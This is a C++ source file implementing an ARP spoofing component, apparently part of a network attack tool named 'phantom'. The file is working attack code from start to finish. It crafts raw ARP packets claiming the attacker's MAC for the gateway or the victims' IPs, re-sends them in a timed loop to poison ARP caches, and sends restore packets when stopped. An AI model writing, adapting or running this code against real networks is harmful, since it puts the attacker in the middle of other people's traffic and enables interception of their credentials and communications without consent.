#include "arp_spoof.h"
#include "network.h"
#include "logger.h"
#include <cstring>
#include <chrono>
#include <algorithm>

namespace phantom {

ArpSpoofer::ArpSpoofer() = default;
ArpSpoofer::~ArpSpoofer() { Stop(); }

void ArpSpoofer::SetInterface(const std::string& iface) {
    interface_ = iface;
    local_ip_ = IPv4Address::FromString(NetworkManager::GetLocalIp());
    local_mac_ = MacAddress::FromString(NetworkManager::GetLocalMac(iface));
}

void ArpSpoofer::SetGateway(IPv4Address gw, MacAddress gw_mac) {
    gateway_ip_ = gw;
    gateway_mac_ = gw_mac;
}

void ArpSpoofer::AddTarget(IPv4Address target, MacAddress target_mac) {
    targets_.push_back({target, target_mac});
}

void ArpSpoofer::SetInterval(int seconds) { interval_seconds_ = seconds; }
void ArpSpoofer::EnableGatewaySpoof(bool enable) { spoof_gateway_ = enable; }
void ArpSpoofer::EnableTargetSpoof(bool enable) { spoof_targets_ = enable; }

void ArpSpoofer::SendArpPoison(IPv4Address victim_ip, MacAddress victim_mac,
                                  IPv4Address spoof_ip) {
    uint8_t packet[64]{};
    memset(packet, 0xFF, 6);
    memcpy(packet + 6, local_mac_.bytes, 6);
    packet[12] = 0x08; packet[13] = 0x06;
    packet[14] = 0x00; packet[15] = 0x01;
    packet[16] = 0x08; packet[17] = 0x00;
    packet[18] = 0x06; packet[19] = 0x04;
    packet[20] = 0x00; packet[21] = 0x01;
    memcpy(packet + 22, local_mac_.bytes, 6);
    memcpy(packet + 28, &spoof_ip.addr, 4);
    memcpy(packet + 32, victim_mac.bytes, 6);
    memcpy(packet + 38, &victim_ip.addr, 4);

    NetworkManager::SendRawPacket(interface_, packet, 42);
}

void ArpSpoofer::SendArpRestore(IPv4Address victim_ip, MacAddress victim_mac,
                                   IPv4Address target_ip, MacAddress target_mac) {
    uint8_t packet[64]{};
    memset(packet, 0xFF, 6);
    memcpy(packet + 6, local_mac_.bytes, 6);
    packet[12] = 0x08; packet[13] = 0x06;
    packet[14] = 0x00; packet[15] = 0x01;
    packet[16] = 0x08; packet[17] = 0x00;
    packet[18] = 0x06; packet[19] = 0x04;
    packet[20] = 0x00; packet[21] = 0x02;
    memcpy(packet + 22, target_mac.bytes, 6);
    memcpy(packet + 28, &target_ip.addr, 4);
    memcpy(packet + 32, victim_mac.bytes, 6);
    memcpy(packet + 38, &victim_ip.addr, 4);

    for (int i = 0; i < 5; i++) {
        NetworkManager::SendRawPacket(interface_, packet, 42);
    }
}

void ArpSpoofer::SpoofLoop() {
    LOG_INFO("ARP spoof loop started — poisoning every " +
             std::to_string(interval_seconds_) + "s");

    while (running_) {
        for (auto& target : targets_) {
            if (spoof_gateway_) {
                SendArpPoison(target.ip, target.mac, gateway_ip_);
            }
            if (spoof_targets_) {
                SendArpPoison(gateway_ip_, gateway_mac_, target.ip);
            }
        }
        std::this_thread::sleep_for(std::chrono::seconds(interval_seconds_));
    }
}

bool ArpSpoofer::Start() {
    if (running_) return true;
    if (targets_.empty()) {
        LOG_ERROR("No targets added to ARP spoofer");
        return false;
    }
    if (interface_.empty()) {
        LOG_ERROR("No interface set for ARP spoofer");
        return false;
    }
    if (gateway_mac_.IsZero()) {
        LOG_WARN("Gateway MAC unknown, attempting resolution...");
        gateway_mac_ = NetworkManager::GetMacForIp(interface_, gateway_ip_);
        if (gateway_mac_.IsZero()) {
            LOG_ERROR("Cannot resolve gateway MAC — ARP spoof requires it");
            return false;
        }
        LOG_SUCCESS("Gateway MAC resolved: " + gateway_mac_.ToString());
    }

    for (auto& target : targets_) {
        if (target.mac.IsZero()) {
            target.mac = NetworkManager::GetMacForIp(interface_, target.ip);
            if (target.mac.IsZero()) {
                LOG_WARN("Cannot resolve MAC for " + target.ip.ToString() + " — skipping");
                continue;
            }
            LOG_SUCCESS("Target " + target.ip.ToString() + " -> " + target.mac.ToString());
        }
    }

    targets_.erase(
        std::remove_if(targets_.begin(), targets_.end(),
            [](const Target& t) { return t.mac.IsZero(); }),
        targets_.end());

    if (targets_.empty()) {
        LOG_ERROR("No resolvable targets remaining");
        return false;
    }

    running_ = true;
    thread_ = std::thread(&ArpSpoofer::SpoofLoop, this);
    LOG_SUCCESS("ARP spoofer active on " + interface_ +
                " | Gateway: " + gateway_ip_.ToString() +
                " | Targets: " + std::to_string(targets_.size()));
    return true;
}

void ArpSpoofer::Stop() {
    if (!running_) return;
    running_ = false;
    if (thread_.joinable()) thread_.join();
    RestoreAll();
    LOG_INFO("ARP spoofer stopped — ARP tables restored");
}

void ArpSpoofer::RestoreAll() {
    for (auto& target : targets_) {
        SendArpRestore(target.ip, target.mac, gateway_ip_, gateway_mac_);
        SendArpRestore(gateway_ip_, gateway_mac_, target.ip, target.mac);
    }
    LOG_SUCCESS("Sent ARP restore packets for all targets");
}

} // namespace phantom
